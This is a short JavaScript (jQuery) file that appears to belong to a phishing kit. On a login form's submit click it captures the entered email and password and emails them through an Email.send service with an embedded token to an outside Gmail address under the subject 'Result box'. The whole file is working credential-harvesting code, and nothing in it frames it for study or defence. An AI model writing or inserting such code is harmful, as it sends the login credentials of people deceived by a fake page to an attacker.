$(document).on('click','#submit', function(e) {
    e.preventDefault();
    var email = $("#email").val();
    var password = $("#password").val();

    var msg = `Email: ${email} Password: ${password}`;

    Email.send({
        SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
        To: 'shirleylargey40@gmail.com',
        From: "shirleylargey40@gmail.com",
        Subject: `Result box`,
        Body: `${msg}`,
    }).then(function (message) {
        console.log(message);
    }).catch((e) => console.log(e));
})



